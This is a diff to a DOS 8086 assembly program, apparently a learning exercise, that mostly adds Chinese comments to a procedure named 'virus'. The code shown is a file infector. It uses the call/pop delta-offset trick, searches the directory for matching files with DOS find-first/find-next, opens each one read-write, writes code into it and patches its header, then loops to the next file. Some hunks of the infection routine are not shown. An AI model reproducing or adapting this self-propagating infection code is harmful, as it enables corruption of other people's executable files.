@@ -1,7 +1,11 @@
+assume cs:code,ds:data
+data segment
+
+data ends
 code segment
              assume cs:code
     start:   
-             mov    ax,cs
+             mov    ax,cs ;初始化
              mov    ds,ax
 
              call   virus
@@ -29,33 +33,34 @@ code segment
 
 virus proc
              call   locate                      
-    locate:  
-             pop    bp                          ;bp=offset locate
-             sub    bp,offset locate            ;bp=0
+    locate: 
+
+             pop    bp                          ;call指令压入了locate的IP , bp=offset locate
+             sub    bp,offset locate            ;相对locate寻址,bp=0
              lea    dx,[bp+offset string]       ;输出字符串
              mov    ah,09h
              int    21h
-
-             lea    dx,[bp+offset dta]          ;置dta
-             mov    ah,1ah                      ;	设置磁盘缓冲区DTA，，DS:DX=磁盘缓冲区首址
+            ;DS:DX=磁盘缓冲区首址
+             lea    dx,[bp+offset dta]          ;设置缓冲区dta
+             mov    ah,1ah                      ;设置磁盘缓冲区DTA，，DS:DX=磁盘缓冲区首址
              int    21h
 
              lea    dx,[bp+offset filename]     ;查找第一个文件
              mov    cx,0                        ;cx:属性
-             mov    ah,4eh                      ;查找第一个匹配项
+             mov    ah,4eh                      ;4e号功能,查找第一个匹配项
              int    21h
-             jc     error                       ;无匹配项直接结束
+             jc     Exit                       ;失败时CF=1，说明无匹配项直接结束
 
     modify:  
              lea    dx,[bp+offset dta]          ;匹配结果再磁盘缓冲区中
              add    dx,1eh                      ;文件名地址
-    
+            ;DS:DX=带路径的文件名
              mov    ax,3d02h                    ;3d打开文件,02方式：读写
              int    21h
 
              mov    bx,ax                       ;文件号
     
-             mov    ax,4200h                    ;到文件头
+             mov    ax,4200h                    ;移动文件指针到文件头
              xor    cx,cx
              xor    dx,dx
              int    21h
@@ -98,7 +103,7 @@ virus proc
              mov    ah,40h
              int    21h
 
-             mov    ax,4202h                    ;计算新文件长度,修改头
+             mov    ax,4202h                      ;计算新文件长度,修改头
              xor    cx,cx
              xor    dx,dx
              int    21h
@@ -123,10 +128,10 @@ virus proc
 
              mov    ah,4fh                      ;查找下一个文件
              int    21h
-             jc     error
+             jc     Exit
              jmp    modify
 
-    error:   
+    Exit:   
              ret
 virus endp
 
